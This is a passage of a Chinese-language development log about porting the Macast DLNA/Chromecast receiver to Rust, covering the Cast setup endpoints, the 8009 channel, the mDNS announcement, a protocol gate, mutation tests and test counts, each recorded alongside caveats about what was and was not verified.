  （2026-10-18，`verify_rust_receiver.sh:2592`）。反引号又出现在一条 `pass "…"` 的文案里，
  脚本又一次执行了一个不存在的命令（`_add_history: command not found`）、又一次把文案印成
  空串、又一次照记 PASS。而上面那句「本轮量过：0」**没有复测**：那两行反引号与那句 0 是同一轮
  写进去的，一个数字在代码之后才量过一次，之后就被当成规则抄了下去 —— §4.13 那句
  「一个没被机器问过的数字和"不提问的检查"是同一件事」在**自己的审计**上再次成立。
  形状上的两处修正：① 那条 grep 本身也不分转义与未转义 —— 它今天会对
  `\`sys.platform\``（合法：转义后就是文案里的两个字符）报"命中"，也就是说它会冤枉安全行、
  又放过真凶，一个既误报又漏报的计数器寿命是一次"这审计干嘛挡我"；
  ② 判据换成**只数未转义的那一个**，并配一条合成正控 —— 把第 2592 行原样抄回临时副本，
  审计必须报 **1**（量过），干净树报 **0**（量过）。
* **一处"两个读者读同一个事实"顺手收干**：`Relay::seekable()` 与 `Relay::content_type()` 现在是
  模块**外**也能问的两个访问器，供字节那一路（`Accept-Ranges` / `Content-Type`）与设备臂
  （`live = !seekable`、`content_type` 交给 `LOAD`）读**同一个**值；设备臂要的**不是那份文档** ——
  从 `status_json()` 里把 `seekable` 抠回来，等于把一个线格式塞进一个判决中间。
  同轮删掉了模块内那份"自己 lock 自己"的重复写法，所以这个访问器不是第 N 份副本，是唯一一份。
* **诚实边界（这条比读数重要）**：这台机器上**没有任何一次真设备投屏被见证过**。
  本局域网没有 Chromecast，而 SSDP 问出来的 DLNA 邻居是**用户自己的 Macast 实例** ——
  让媒体在他另一台机器上响起来不是这个脚本可以擅自做的事（§10 第一条），所以 §16 只走
  "缓存里没有这一行"那一格，成功那一格只有 `push_tests` 的 46 条打在自家假设备与假 SOAP 服务器上。
  数字侧：`src-tauri` 2,841 行 → **2,975 行**（host.rs 1,899 + main.rs 1,076）。
  **以及本分支从未推送 ⇒ 本轮这 603 条与那 4 趟真机读数没有任何 CI 见证过。**

**Rust 侧把 setup 面接进壳时量到的事**（2026-10-18，`macast-cast/src/setup.rs`（655 行）
+ `setup_tests.rs`（755 行 / **30** 条）+ `src-tauri/src/main.rs` 起它 + `macast-core/src/url.rs`
多了一个主人 + `scripts/verify_rust_receiver.sh` §20（**26 条**），整跑 **169 条 / EXIT=0**）：

* **这张脸是发送端在投之前读的那份文档**：`GET /setup/eureka_info`（8008 与 TLS 的 8443 同一份
  字节）与 `GET /setup/icon.png`。三条"只有读客户端才读得出来"的事实全部对着
  `.venv` 里的 **pychromecast** 现场问过，不是引规格：`dial.py:25-26` 把 **8008 / 8443 两个数钉死**
  （mDNS TXT 里只有 socket 口，所以绑到 8010 等于不存在）；`dial.py:133-134` 是
  `check_hostname=False` + `verify_mode=CERT_NONE`（这就是自签证书能用 8443 的原因，
  也是"我们不必假装证书可信"的依据）；`dial.py:157` 发的字面是
  **`?params=device_info,name`** —— 而参考实现的过滤是 `{k: v for k, v in full.items() if k in wanted}`，
  所以交回的是 `name` 在前，**文档的次序而不是调用方的次序**。这条判据在单元层与真机层各问一遍，
  因为"按请求者给的顺序重建答案"照样能解析、照样是错的。
* **`capabilities.multizone_supported` 必须是显式的 `false`**：pychromecast 在有 `device_info` 时读
  `capabilities.get("multizone_supported", True)` ⇒ **漏写这一格等于宣称支持多房间**，于是每次发现都多一发
  `?params=multizone`。而那一发的正确答复是一个 **200 的空对象**（`dial.py:317` 读 `"multizone" in status`），
  不是 404 —— 404 会说"没有这台设备"，空对象说"没有这个字段"。
* **8008 不回落，这是决定不是偷懒**（两条理由合成一条）：发送端钉死 8008，所以走
  `PORT_FALLBACK_RANGE` 那 20 个口只买到一个没人敲的口；而回落的**第一步就是 8009**，那是 Cast
  socket 的口 —— 参考实现能承受这个重叠是因为它 `start()` 里**先**绑 Cast（`protocol_cast.py:411-413`），
  一个还没接上 Cast 通道的壳只会把它抢走。夹具在这里骗了我一次：第一版用 `127.0.0.1:P` 去占口，
  而产品绑的是 `0.0.0.0:P`，**绑定照样成功**，于是那条"拒绝"从未发生 —— 判据改成用同样的
  wildcard 去占，才真的问到那一格（§4.2「假命令行工具的输出必须是真工具在这台机器上的逐字输出」
  的同一族：**夹具必须长成生产会遇到的形状**）。
* **`serve_tls` 少发 `close_notify` 是一次真握手抓出来的产品 bug**：写完响应就 drop 流 ⇒
  rustls 客户端在 `read_to_end` 上报 `UnexpectedEof`（"peer closed connection without sending
  TLS close_notify"），**字节全都到了也算错**。参考实现不显式关闭也无所谓，因为
  `socketserver.shutdown_request` 对包好的 TLS socket 调 `shutdown(SHUT_WR)` 天然发了
  close_notify —— 所以这不是"客户端太严格"，是我们交出去的协议少了一半。打桩测与明文 socket 测
  都看不见这一格，只有 TLS 客户端能看见。
* **查询串读取器搬了家，因为出现了第二个读者，而参考实现自己就有两个读者**：
  `parse_query` / `unquote_plus` / `split_once_ascii` 从 `macast-upnp/src/http.rs` 搬进
  `macast-core/src/url.rs`（`macast-cast` 依赖 `macast-upnp`、从不反向 ⇒ 一张两个面都要读的
  规则不能是哪个面的私有物）。搬的时候在本机把两边的答案各问一遍，因为**它们对空值相反**：
  cherrypy 的 `parse_query_string` 默认 `keep_blank_values=True`（`lib/httputil.py:369`），
  `urllib.parse.parse_qs` 默认 `False` —— 于是 `?params=` 在管理面是**一个空串参数**，
  在 setup 面是**整份文档**。处理方式是交回**两个函数**（`parse_query` 与 `parse_qs_first`），
  不是"一个带 flag 的函数"：合成一个就把"哪一个读者"这个决定推给调用点去记。
* **沉默这一族的第四例，这次方向是"该有却没有"**：那条 8008 被占的断言要求日志里出现每个候选口的
  DEBUG 行，而它永远不在 —— 默认阈值 INFO 把它滤掉了。修法是**把窗口打开再问**
  （`crate::DebugWindow::armed()` 包住那一次调用），不是放宽断言。上一轮收的是"读 DEBUG 的用例互相撞"，
  这一轮收的是"某一行 DEBUG 本该在场"：**两边都不能让别人的调度决定这一格有没有被问过**。
* **一处本轮发现的既有缺口，setup 继承了它并写在代码注释里**：这个壳**不看 `Macast_Protocols`** ——
  那份协议启用表今天只用来生成 `query=status` 的 `protocol` 字段，DLNA 的 HTTP/SSDP 与这张脸都无条件起。
  所以"在页面里关掉 Chromecast"的用户仍然会在 8008 上被问到设备身份。缓解只有一条事实那么宽，
  而且是用**局域网地址**（不是回环）问过的：这张脸不吐令牌、不吐路径、不吐控制动词
  （`$SDIR` 与 `Api_Token` 都不在正文里，非 `GET` 一律 501）。等启用表变成门的时候，
  `main.rs` 里那两处 "Started unconditionally" 注释就是同一批要改的地方。
  （**同一天的下一轮把这一格变贵了**：Cast 的 8009 也无条件起，见下面那条 —— 那里没有
  "这张脸不吐控制动词"这条缓解，它就是控制面。）
* **诚实边界（这条比读数重要，但只活了几个小时）**：那一轮 `grep -rn "CastChannel" src-tauri/src/` 回
  **0 行** —— Cast 的 8009 通道还没接进壳，`_googlecast._tcp` 的广播也还是 `*(next)*`，所以**当时没有任何发送端会走到这张脸**。
  §20 那 26 条证明的是线与文档的形状（含一次真 TLS 握手 + "8008/8443 交回同一串字节"），
  不证明"手机找得到这台 Mac"。8009 那一格**同一天的下一轮就翻面了**（见下面那条"把 Cast 的 8009
  通道接进壳"，`grep` 现在回 **6 行**）；广播那一格**仍开着**，所以最后那半句还是今天的读数。
  登记在 `docs/Rust-Port-Design.md` §15 与 §16 第 10 条。
* **计数与一次自我更正**：那一轮收尾时 `macast-cast` **633** 条，两台仪器都说这个数
  （`--list` 与逐文件字面扫描；`setup_tests` 30）；`macast-core` 86、`macast-upnp` 316；
  `src-tauri` 2,975 → **3,077 行**。本轮把 `TESTS_IN_THIS_CRATE` 的**散文**先改成了 633、
  常量还留在 632 —— 是附录 B 那条按名字的引用体检抓回来的（下限是 `>=`，低 1 不会红 ⇒
  **没有任何用例会替你发现它**，这正是 §4.13 那句"一个没被机器问过的数字"的形状）。
  **以及本分支从未推送 ⇒ 上面这些用例与那 169 条真机读数没有任何 CI 见证过。**

**Rust 侧把 Cast 的 8009 通道接进壳时量到的事**（2026-10-18，`macast-cast/src/channel.rs` +
`src-tauri/src/{host,main}.rs`；`channel_tests` **40** 条 + 真机脚本 §21 的 **5** 条）：

* **上一轮那条"诚实边界"翻面了，而翻面之后现形的是一条产品 bug**。`grep -rn "CastChannel" src-tauri/src/`
  从 **0 行** 变成 **6 行**（`host.rs` 4、`main.rs` 2）：`main.rs` 走
  `cert::ensure_in_setting_dir` → `CastChannel::new` → `host.set_cast` → `channel.start(pair)`，
  并且**排在 setup 脸之前**（8009 才是发送端要连的口，也是 `setup` 那条"8008 不回落"的理由另一半）。
  第一次让真发送端连上之后，`vlc_sender_sim.py` 走完 auth → LAUNCH → transportId → LOAD，
  而 **LOAD 之后只拿到那一次请求驱动的答复，此后一句话都没有**，直到 20 秒耐心用尽自己断开
  （`READ_POLL` 的 doc 记的就是这三段：一次 BUFFERING、沉默、`Cast sender dropped`）。
* **成因是"读跨一次阻塞持锁"**（本轮最贵的一格，因为它**不可能**从参考实现抄出来）：
  `client_loop` 在**持有这条连接的 `Mutex` 期间**做 `read_exact`，而读超时是
  `set_read_timeout(None)`。rustls 的一次 `read` 会动会话状态，所以必须串行化 —— 但推送
  （`_watch_playback` 与每一次状态变化）排在同一把锁后面，于是它拿不到锁、发不出去。
  Python 那边**根本没有这一层**：裸 socket 不需要锁保护加密状态，所以它的写法在这里是错的。
  修法是 `READ_POLL`（200 ms）轮询 + `read_frame`，**锁在两批字节之间放开**。
  **牙齿按 §13.4 量过**：把超时改回 `None`（同型替换）之后 §21 **恰好红 1 条**，
  红的那条交出的就是"投屏之后表从没动过 PLAYING"这句解释；还原 md5 一致
  （`f9b0bd56ca5fe60ff0ed5c00ffa84b1f`），且**改完必须重新构建**再跑 —— 同一长度的还原会留下
  一个"有效"的旧产物，那是 Python 侧 stale `.pyc` 那一族的 Rust 版本。
* **第二格同样只有真 socket 才问得到：先拒再分配**。帧头那 4 字节是**对端给的**（`>I` 能声称
  4 GiB），而旧实现 `vec![0u8; length]` 先申请再读。参考实现的 `_recv_exact(sock, length)` 是
  **累积**读，从未一次性申请，所以这条也不是照抄。新增 `MAX_FRAME_BYTES`（8 MiB，
  **我们选的数，不是从设备上量出来的**），超了交 `InvalidData` 结束会话；
  这条拒绝今天只到 **DEBUG** 那句 `Cast client disconnected: …`（与对端正常断开同一句），
  默认阈值下**不进日志** —— 形状记在 `docs/Rust-Port-Design.md` §8 与 §16 第 11 条，
  要改的是分级，不是上限。
* **`is_none()` 不是"这一刻写下去能不能被读到"，而 `expect` 的文本可以正好是反面的谎**：
  `slot()` 从 `expect` 改成 `Option`，因为"表里没有这个 id"是**可达状态** —— `stop()` 会清空整张表，
  而状态 watcher 比它启动时那个 reader 多活 `LOAD_GRACE_SECONDS`。旧那句 `expect` 写的是
  "connection slot exists while its client loop runs"，而循环之所以从没回来确认这一点，
  **正是因为它阻塞在那把需要同一把锁才能注意到的读上** —— 症状与成因同形，
  这也是上一轮那条 socket 判据（`socket_carries_writes`）的同一族第三格。
* **夹具自己撒的一次谎（§4.2 那一族，这次是我的 socket 替身）**：第一版用 `Cursor` 当假流，
  它对短读回的是 `Ok(0)` —— 那是 EOF，走 `BrokenPipe` 分支 —— 于是"分片帧要等下一次轮询才补齐"
  这条用例**测的是夹具的结束，不是产品的等待**。换成 `LiveSocket`（队列空时交 `WouldBlock`）
  之后才真的经过 `Ok(None)` 那一路。判据的形状：**替身要按协议交回"还没有"，而不是交回"没有了"**。
* **验收脚本这一轮错的那一半是观察时机，不是产品**：第一版把状态表放在发送端脚本**返回之后**读，
  于是永远读回 `STOPPED` 并红 —— 而那支脚本读到 `PLAYING` 就退出，切片 12 秒、发送端耐心 20 秒，
  **任何"在投屏期间发生"的判据都必须并发地问**（现在先 `soap_action Stop` 当控制，
  再起一条后台轮询 `STATE_WAIT`，然后才跑发送端）。§4.2 那条「等那个账本，不要抓客户端返回的那一瞬间」
  第三次在 Rust 侧现形，这次的账本是我们自己的共享状态表。
* **一处未解释的读数，留在这里而不是被"修好了"覆盖**：§21 第一跑（两处改动之前）的
  `logs/MPV.log` 里，HTTP 切片投出去**约一秒之后**就有一行 `end-file reason=eof`。
  两处改动之后这一格没有再现，但**没有任何一次测量把 EOF 归给其中任何一个改动**，
  而那一趟的临时目录没有保留下来（`MACAST_VERIFY_KEEP=1` 才保留），所以现在**无法复算**。
  它记为"未解释的观察"，不是"已修"；下一次跑 §21 若再现，判据是那条 `end-file` 的 `reason`
  与 `file_error`，不是"画面播了"。
* **两处仍然欠着，方向别读错**：① `_googlecast._tcp` 的广播还没接（§15 那行），
  §20/§21 能跑只因为脚本**手动填 IP:端口** —— 所以"手机 Cast 按钮里看得到这台 Mac"
  这句话今天说不出口；② `Macast_Protocols` 那道门现在**比上一轮更贵**：它漏的不只是 8008 上的
  身份问答，而是**一条真能完成投屏的 8009 控制面**（一个在页面里"关掉 Chromecast"的用户，
  局域网里任何知道地址的发送端仍然能投）—— 登记在 §16 第 12 条，改的时候 `main.rs` 里那几处
  "Started unconditionally" 是同一批地方。
* **计数（两台仪器一致）**：`macast-cast` **637** 条（`--list` 637、逐文件字面扫描 637，整 crate
  `637 passed; 0 failed; finished in 6.85s`；`channel_tests` 40、`setup_tests` 30），
  `macast-core` 86、`macast-upnp` 316；真机脚本 **174 条 / 0 失败 / EXIT=0**（§21 5/5、§20 26/26）。
  `TESTS_IN_THIS_CRATE` 从 633 走到 637 是**量出来的**，而它下面那句"地板比真值低 537"的算术
  一并删掉了 —— 一个手算的差值会随下一次加用例变成第二句谎，改成"65 对着上面量出的 637"。
  **以及本分支从未推送 ⇒ 上面这些用例与那 174 条真机读数没有任何 CI 见证过。**

**Rust 侧把 `_googlecast._tcp` 接上广播时量到的事**（2026-10-18，`macast-cast/src/announce.rs` +
`scripts/mdns_announce_probe.py` + `macast-cast/tests/golden/`，`announce_tests` **19** 条 + 真机脚本 §22 的 **9** 条）：

* **先取证，再写包**：探针只替换 `zeroconf._core.async_send_with_transport`（grep 过整包，
  那是**唯一**一处 `transport.sendto`），所以一个字节都没上局域网 —— 真广播会在跑的这一段时间里
  让本机多出一台 Chromecast。每条报文用**两个**读者解码（手写遍历 + `DNSIncoming`）并逐记录比对
  name/type/TTL/class，其中 class 必须把 zeroconf 掩掉的 flush 位从 `.unique` 拼回来
  （`_dns.py:121-122`）—— 否则"探针看到了 flush 位"这句是假的，而那一位正是本节第一行
  「搜到但投不上」那一族里读侧掩码漏掉的同一个东西。
* 广播的形状（全部是读数）：5 条记录 PTR/SRV/TXT/NSEC/A；TTL 4500/120/4500/120/120；
  **除 PTR 外全带 cache-flush**；`flags=0x8400`；注册 3 串 × 225 ms，`update_service` 同形，
  goodbye 3 串 × 125 ms 且**每条 TTL 写成 0**（不是空报文）；本机参考实现开了 **6 个**发送
  socket（`127.0.0.1`、局域网口、Tailscale、三个虚拟网桥），每串各发一份同样的字节。
* **`A` 与 `NSEC` 的先后不是协议事实**：`get_address_and_nsec_records` 交回的是 `set`，
  本机实测 `PYTHONHASHSEED` 0/1/2 出 `NSEC,A`、12345 出 `A,NSEC`。所以语料冻了**两行**，
  而 `announce_tests` 两条都要比 —— 第一版只冻一行，那是把一个哈希种子钉成规范。
  固定前缀（PTR/SRV/TXT）在两行里逐字节相同，用例把"两行第一次不同的偏移 = 266"也钉住：
  不同的如果更早，说明 set 顺序不是唯一的非确定性，逐字节对拍这个目标本身就不成立。
* **§22 首跑就抓到一条产品 bug，是我自己的**：A 记录建在 `advertised_hosts`（浏览器**加入组**
  用的宽集合）上，线上于是出现 `192.168.1.5, 192.168.148.0, 192.168.215.0, 192.168.139.3`
  —— 三个 VMware/VirtualBox/Docker 网桥。**这就是本节第一行的成因，而这次是我们在发**：
  发送端随机挑一个，没有路由，用户读到的是"能搜到、点投屏没反应"，我们这边一句错误都没有。
  主人换成 `advertised_addresses`（发送端够得着的窄集合）。判据一条同时问两遍：
  行为上，本机两个集合长度不同（1 对 4），所以"广播的条数 == 窄集合的条数"问得出东西；
  源码上，按名字审计 `from_setting` 的函数体**只许**出现 `net::advertised_addresses(` ——
  因为"只有一块网口的笔记本"上两个集合相同，那条行为断言会**空转**。
  变异体（换回宽集合）红 **1** 条，正是这一条。
* **广播的 socket 不 join、也从不读，而"为什么不 join"这句话现在是量出来的**：原文写的是
  「`SO_REUSEPORT` 把每个进来的数据报只交给绑在同端口的一个 socket，第二个 joined socket 会随机
  吃掉设备列表的一半」，并由它推出「responder 落地时必须把两个读者合成一个」—— 那句话**从未问过
  内核**，却已经决定了下一步的形状。仪器 `scripts/mdns_reuseport_probe.py`（2026-10-18 在这台 Mac
  与那台 CachyOS 上各跑；egress 用 `IP_MULTICAST_IF=127.0.0.1` + TTL 1 钉在 lo0，一个字节都不上
  局域网；每例的报文**事务 id 各不相同**，所以"每个 socket 都拿到全部"是逐条可核而不是两个计数相等；
  并且每个 socket 只统计**自己发出的那些 id** —— 第一次在 Linux 上读出 `14 of 12`，那是场上真实
  mDNS 的包，不过滤就会被当成"分发规则"）。两台机器的读数：**多播复制给每一个 socket**
  （macOS `[12, 12, 0]`、`[12, 12, 12]`；Linux `[8, 8, 8]`，第三格是**没 join** 的那个 —— Linux 上
  绑 5353 就收得到多播），所以旧句子在两个内核上都不成立；但**单播整条只交给一个 socket，交给谁随
  流变**（Linux 同一进程三趟都 `[8, 0, 0]`，换进程给出 `[0, 0, 12]`、`[0, 8, 0]`；macOS 上 wildcard
  绑定连**对照组**都收 0，很可能是系统的 mDNSResponder 持有而非特权 `lsof` 点不出它，绑到**确切目的
  地址**的 socket 则把整条流从 wildcard 那个手里全部拿走，`[12, 0]` 逐趟稳定）。**"合并"这个结论
  留着，理由与位置都换了**：要合并的是**长期在场的那个 socket**，动机是**单播**（今天它 competing
  却从不读，在 Linux 上还替每份多播攒了没人排空的队列），不是"第二个 joined socket 会分到多播"。
  responder 落地时它 join 且读：答查询 + 把听到的喂进设备账本，于是"一直占着 5353 的 socket"就是
  "有人在读的 socket"。`mdns.rs::open` 里那句"绑定失败时也还能以单播收到我们查询的答复"也改成了
  **条件句**：单播只回到**某一个**绑在 5353 的 socket，读它的那个是我们的才算数。
  形状记在 `docs/Rust-Port-Design.md` §8 与 §16 第 13 条：**一个没问过内核的机制陈述，只要写成了
  "所以下一步怎么做"，它就会决定代码，而它错的时候没有任何一条用例会红** —— 单元层每个测试各开各的
  socket，真机层它表现成"网络不稳"。
* **改一个超长友好名 = 参考实现整个 Chromecast 起不来**（本机实测）：`ServiceInfo(...)` 打包
  TXT 时对 >255 字节的属性抛 `ValueError: bytes must be in range(0, 256)`，而那一行**不在**
  `advertise()` 的两个 `try` 里（200 字节过、300 字节抛），于是一路冲出 `_advertise()` 与
  `ChromecastProtocol.start()` —— 用户改一个设备名，买到的是接收端没有了。Rust 侧**截属性不截接收端**
  （按字符边界截到 255，WARNING 里点名字段、原长度与上限），判据两条。**Python 侧今天仍然如此** ——
  这句话不是"已修"，而它记在这里是因为下一次"照抄参考实现"会把它抄回来。
* **两条我自己仪器的错，都长得像产品坏了**（§4.2 那一族，这次抄的是**第三方库的 API**）：
  ① `ServiceBrowser(zc, type_, 6.0, listener)` —— 0.151.3 的第三个位置参数是 handlers，
  于是 `'float' object has no attribute 'append'` 变成 §22 的 **7 条红**；
  ② `IPVersion.V4` 不存在（叫 `V4Only`），traceback 打在数据要去的那个文件里，
  于是后面 5 条检查全读成 `none`。两次都是**先怀疑仪器再怀疑产品**才对：第一条里
  "解析成功"那一条已经是 PASS，产品没问题 —— 红的形状是 harness 的 API 记忆。
* 读数：`macast-cast` **656**（两台仪器一致：`--list` 656、逐文件字面扫描 656；
  `announce_tests` 19、`channel_tests` 40、`setup_tests` 30），整 crate `656 passed; 0 failed`，
  模块级 `announce::` 19/19；真机脚本 **183 条 / 0 失败 / EXIT=0**，其中 §22 用 `.venv` 里那套
  **zeroconf** 冷启动解析成功、**42.8 秒** —— 而那一节跑在第一串广播之后好几分钟，所以这一条同时是
  **60 秒 keepalive** 的真机见证（libvlc 那类"只听不问"的发送端就靠它）。端口 == 8009 实际绑定口、
  TXT `id` == 设置里那个 USN、`ca=5`、TXT 键序、SRV 目标、A 集合与广播者自己声明的那一份逐条对上。
* **七个变异体，逐支的红数**（一条命令一支，`/tmp` 备份 + EXIT trap 还原 + md5 回到
  `9262bde80c94e50004b84953565a6e0e`；这一节的每个数都能从当时的输出重算）：goodbye 被停止标志
  门住 → **1**（只有 `run()` 那一格红，`burst()` 那一格照绿 —— 这就是为什么要两条）；压缩表不再记
  后缀偏移 → **2**（两条逐字节对拍，语义级的读回用例不动）；PTR 挂上 flush 位 → **3**；
  截断改成空操作 → **2**；重播间隔 60 → 600 秒 → **1**；名字规则不去首尾连字符 → **3**；
  A 记录改读宽集合 → **1**。**没有一支是 0 红**，这一轮不需要"覆盖空洞"那一格的新记录。
  **以及本分支从未推送 ⇒ 这些读数没有任何 CI 见证过。**

**Rust 侧把 `Macast_Protocols` 变成门时量到的事**（2026-10-18，`src-tauri/src/host.rs` 的门 +
`src-tauri` **第一批 9 条**用例 + 真机脚本 §24 的 **7** 条；整跑 **190 条 / 0 失败 / EXIT=0**）：

* 三张脸是一扇门：8009 接收端、8008/8443 setup 脸、`_googlecast._tcp` 广播同属 Chromecast 协议。
  只门住其一会造出一种新故障形状 —— **身份答得出来、连接握不上**，正是 §4.1 第一行的变体。
  证书生成也在门后：用户关掉的协议不该往设置目录里留密钥材料（§24 直接查那两个文件不存在）。
* 参考实现的读法四条，逐条问过（`macast.py:702-784`、`:1268-1271`、`build_protocol_group` 的兜底）：
  ① 存成**字符串**的列表算一条记录 —— 而共享读接口 `get_str_list` 对那个形状交回**空表**，
  在这里空表的意思是"全新安装 = 全开"，**恰好反了**：用户手改 JSON 收窄，我们却把门全打开；
  ② legacy 单键是**追加**不是优先，且读之前要 `has()`（§4.2 第一条：`get` 会把默认值写进去）；
  ③ 不认识的标题跳过并写一行；④ 全部不认识 ⇒ 只留 DLNA，不"什么都不听"。
  **一条两边都不认的拼法故意不单边修**：`canonical_title` 只去带空格的 `" protocol"`，
  所以紧凑的 `ChromecastProtocol` 在 Python 与 Rust 两侧都解不出。单边"修好"会让两边对
  "哪些存量值算数"给出不同答案 —— 那比一个有 warning 的空档糟得多。
* **门必须是真机判据，单元判据只能问读法**：`host::tests` 能证明谓词读得对，
  证明不了**插座关着**。一个"读了一次门、然后第四处 `start()` 绕过它"的实现在这棵树里
  会全绿。所以 §24 起第二台只开 DLNA 的实例，去**连** 8009/8008（要拒）、去**听**广播（要没有）、
  去看日志（要说出是开关关的），并拿 `description.xml` 当正向对照。
  顺序也是判据的一部分：**先杀掉第一台**再测 —— 8009/8008 是发送端钉死的口，
  第一台活着时"我们没起"与"起了但抢不到口"在外部不可分，而那正是 §20"8008 不回落"要避免的歧义。
* **两条仪器错，又是我的**：① 段落里的日志检查用了 `log_grep`，而它只搜**第一个实例**的目录 ——
  于是"没有说明句""announcer 说了话"两条红得完全反向；修成 `gate_grep`。
  ② 我把 `query=status` 当正向对照，而**这条查询在这份壳里还没移植**，它诚实回"不认识的字段"，
  `code == 0` 的断言就把一扇关上的门读成了应用死了 —— 换 `description.xml`。
  这与 §4.14 那条「空结果要说清是哪一种空」是同一格：**先量清楚这条路由存在不存在，再拿它当证据**。
* **一条真日志缺陷是 §24 顺手抓到的**：门关上时汇总行仍写「no certificate to wrap 8009 with」,
  而这条路径上根本没人问过证书 —— 那句话在这一刻是假的，它把读者送去修一个没坏的东西
  （§4.2/§4.3 那一族：日志指错嫌疑人比不指更贵）。现在两种 `None` 分两句写，
  §24 钉住"解释 8009 的那一行必须点名开关"。
* **故意没做的那一半**：DLNA 的 HTTP 脸仍然无条件起。它同时承载设置页与管理 API，
  把它一起门住 = 用户在页面里关掉 DLNA 就没有页面能把开关改回来。
  参考实现"只剩 Chromecast 时页面归谁"本机**没量过**，所以这一格先量再改，
  写在 `docs/Rust-Port-Design.md` §16 第 12 条而不是顺手做掉。
* 顺带第一条：`src-tauri` 此前**一条用例都没有**。这一轮它有了 9 条，于是 `pin_test_dir` 那条
  纪律（每个用例第一句、由审计用例扫全 crate）也照 `macast-cast` 的形状建了起来 ——
  门的测试要写日志，不钉目录就会去写用户的真实配置（§10 第一条）。

**门的变异电池与两条仪器谎**（同日，**12** 支定点变异 —— `host.rs` 9 支 + `main.rs` 3 支，
§24 在修前修后各重测一次；每支一条命令，`/tmp` 备份 + EXIT trap 还原 + md5 回到
`main.rs 2b54d42d…` / `host.rs` 逐支各自回到当轮基线）：

* 逐支读数：**去掉空白折叠 1 红 / 去掉大小写折叠 4 红 / 去掉前导 `trim()` 0 红 /
  去掉末尾 `strip()` 0 红**（前导与末尾两问各自独立跑过）/ 去掉字符串强制 1 红 /
  去掉 legacy 追加 1 红 / 去掉 `has()` 门 1 红 / 兜底换成 AirPlay 1 红 /
  跳过改成沉默 1 红 / 在 setup 那扇门口第二次读门 1 红 / 第二处构造 announcer 1 红 /
  删掉证书的门 ⇒ §24 红 6 条。
  十一支里最有用的是那两支 **0 红**：它们把 `canonical_title` 从"每一步都承重"
  （我先写的一句话，被机器证伪了一半）改成了**两颗牙 + 两个保险** —— 折叠有牙，两个 strip
  是防御性照抄参考实现。docstring 现在写的是这个，并带着"删掉保险听不到任何声音"那句理由：
  读信"全都承重"的人会删掉一个保险，然后什么也没听见（§4.13「一个没被机器问过的数字」的同族）。
* 新加的那条判据来自 `has()` 那一支：**门的那次读取不许把键造出来**。`Setting::get`
  会把默认值写进表里，下一次 `save` 就落盘 —— 没有 `has()` 门住，每次冷启动都会往一个从未
  有过 legacy 键的用户设置里写 `Macast_Protocol = ""`（§4.2 第一条最老的那个陷阱，在 Rust 侧
  的形狀）。用例问的是调用之后 `has(Key::MacastProtocol)` **仍然为假**。
* **§24 的广播检查原来不提问**，而且是在变异体面前当场暴露的：它原来是"实例启动之后再浏览
  8 秒"，而 announcer 的节奏是"3 包 / 225 ms，之后 60 秒沉默"（`REANNOUNCE`），所以它对一台
  **确实在广播**的机器回答 pass。把证书的门删掉当变异体（gated 实例真的建了 announcer、绑了
  8009、日志写了 `mDNS: announcing`）时 §24 红 5 条，而这一条照旧绿 —— 那 5 条救不了它，
  因为它们是插座、日志与密钥材料。修法是把浏览挪到**实例启动之前**，窗口 30 秒正好横跨初始
  突发（§22 的 75 秒窗口管 keepalive 那一次，两边不重叠）。同一支变异体现今红 **6** 条，多的
  那条是 `the gated instance announced itself anyway: Macast-Gate-Off._googlecast._tcp.local.`。
  清洁跑仍然是 7/7、整脚本 **190 条 / 0 失败** —— 一条"绿"从今往后只在真的没人广播时出现。
* **同一格还连着第二条仪器谎**：两段 seed JSON 写的键是 `FriendlyName`，而真正的键名是
  `DLNA_FriendlyName`（`macast-core/src/setting.rs:94`）—— **一个没有任何读者拥有的键**。
  它和上一条咬在一起：gated 实例因此回退到 `Macast-Pavia-MacBookPro-1859` 那个默认名广播，
  而检查匹配的是 `Macast-Gate-Off`，于是"线上什么都没有"这句答复来自一个拼写错误而不是门。
  改对之后 §22 那一行印的是 `Macast-Rust-Verify`（键真的生效的可见证据），而 §24 的
  `MDNS_INSTANCE` 为空时这一问**明说是 skip**（本轮没有广播 ⇒ 没有正向对照 ⇒ "线上没有"
  不能算答案），照 §4.14「空结果要说清是哪一种空」。
* **一条形状与 §4.14 那条"同型替换"同一个族，这次栽在"没有读数"上**：第二处构造那一支的
  第一版是把 `setup::SetupServer::start(...)` 再写一遍，而它把 `setup_config` **移走**了 ⇒
  编译错误 ⇒ `cargo test` 一个字都没打印（既没有 `test result` 也没有红），只看退出码时它与
  "这一格没人问"长得一模一样。换成构造 announcer（`&setting` / `&discovery_log` 都是借用）之后
  才有读数：**编译错误的正确读法是"这一支还没跑"，不是"这一支不红"**。
* 顺带把审计本身补宽了一句：`main.rs` 现在按**三条**问 —— 门读在每张脸之前、只读一次、
  **每张脸的构造点恰好一个**（带 `(` 才数，所以注释里提一次类型名不算构造点）。第三问是这一轮
  加的第二支变异体的落点：`find` 永远只看第一处，所以"第四处 `start()`"原本正好躲在针眼后面。
* **一条留在文档里的局限**：`every_cast_face_is_behind_the_gate` 的两问里，"整份运行只读一次"与
  "每张脸只构造一次"各有自己的变异体（各 1 红），而**"门读在脸之前"那一问没有可编译的同型变异** ——
  把那次读取挪到 `CastChannel::new` 之后必须同时删掉它前面的两个用户（说明句与证书的 `if`），
  那就是重写不是替换，红了也说不清是规则的牙还是重写的牙。它今天的见证是 §24 那 6 条一起红
  （插座、广播、密钥材料、说明句），这条局限写进了测试的注释，不留成"位置也测过了"。

**Rust 侧把 `query=status` 与 `query=interfaces` 接进管理面时量到的事**（2026-10-18，
`macast-upnp/src/http.rs` 的一张文档四个主人（`Setting` / `StateStore` / `Subscription::rows` /
`macast_core::net`）+ `http_tests` **12** 条 + `macast-tauri` 的第 **10** 条 + 真机 §23 的 **25** 条；
整跑 **215 条 / 0 失败 / EXIT=0**，脚本现在 27 节 —— **门那一节从 §23 挪到 §24**，本文、脚本注释与
`src-tauri` 测试注释里指"那一节"的句子一起改的编号；上面那批 §24 就是它们）：

* **本分支第一条"单元 0 红 / 真机红"的读数**。把宽地址集合（`advertised_hosts`，浏览器加入组用的
  那个 superset）喂给 `network_facts`：**328 条单元用例全绿**，真机 §23 红一条。原因不是用例写得薄，
  是**结构** —— 一次调用同时产出 `server.ip` 与 `network.advertised`，所以"这两个键互等"这条断言
  **对任何集合恒真**（§16 那种"设计上恒真的账本用法"在文档层再现）。真正问这一问的是"页面给的集合
  == §22 从线上读回来的 A 记录集合"那条**跨读数者**比对。这与上一轮 §22 抓到广播侧读错集合是同一枚
  硬币的两面：**同一份数据发给别人之前，必须由另一个实现读过它**。
